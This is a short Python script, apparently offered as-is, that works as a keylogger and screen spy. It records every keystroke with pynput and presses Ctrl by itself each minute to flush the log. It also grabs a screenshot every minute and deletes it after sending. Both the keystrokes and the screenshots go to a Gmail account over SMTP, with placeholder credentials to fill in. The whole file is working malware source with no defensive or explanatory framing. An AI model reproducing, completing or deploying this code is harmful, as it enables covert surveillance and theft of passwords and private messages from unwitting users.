import os,time,smtplib
from pynput import keyboard
from pynput.keyboard import Key,Controller
import threading
import pyautogui

from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


premi = Controller()
def timer():
    global tasti
    tasti = ''
    def on_press(key):
       try:
          global tasti
          tasti = tasti +'%s'%key
       except AttributeError:
             print('special key {0} pressed'.format(key))
    def on_release(key):
         if key == keyboard.Key.ctrl:
                 return False
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
    tasti_premuti = smtplib.SMTP('smtp.gmail.com', 587)
    tasti_premuti.ehlo()
    tasti_premuti.starttls()
    tasti_premuti.login('your email address', 'your password')
    tasti_premuti.sendmail('your email address','your email address',str(tasti))
    tasti_premuti.close()
    timer()

def key_log():
    while True:
        time.sleep(60)
        premi.press(Key.ctrl)
        premi.release(Key.ctrl)
        key_log()

def key():
    directory_corrente = os.getcwd()
    im = pyautogui.screenshot()
    im.save(directory_corrente+'/'+'a.png')
    msg = MIMEMultipart()
    msg['subject']= 'random'
    msg['from'] = 'your email address'
    msg['to'] = 'your email address'
    with open(directory_corrente+'/'+'a.png', 'rb') as fp:
        img = MIMEImage(fp.read())
    msg.attach(img)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()
    s.starttls()
    s.login('your email address', 'your password')
    s.send_message(msg)
    s.close()
    os.remove(directory_corrente+'/'+'a.png')
    #print(tasti)
    time.sleep(60)
    key()


processo = threading.Thread(target=key_log)
processo.start()

processo2 = threading.Thread(target=timer)
processo2.start()

key()
